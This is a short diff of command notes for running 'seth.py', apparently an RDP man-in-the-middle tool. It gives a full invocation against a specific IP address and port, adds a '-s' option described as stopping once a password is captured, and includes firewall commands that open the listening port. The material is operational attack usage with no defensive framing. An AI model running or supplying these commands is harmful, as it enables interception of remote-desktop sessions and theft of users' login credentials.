@@ -6,11 +6,11 @@
 
 
 /////////////// Cmd ///////////////////
-Seth/seth.py -p 1212 192.210.239.122 24931 --check-port 8080 -o log.txt
+Seth/seth.py -p 1212 192.210.239.122 24931 --check-port 8080 -o log.txt -s
 
 =================================================================================
 python3 seth.py -c <cert> -k <private key> -p <listen port> server_ip server_port 
-
+-s : stop when get password
 ------------ firewall ------------------
 $ firewall-cmd --zone=public --add-port=1212/tcp --permanent
 $ firewall-cmd --reload
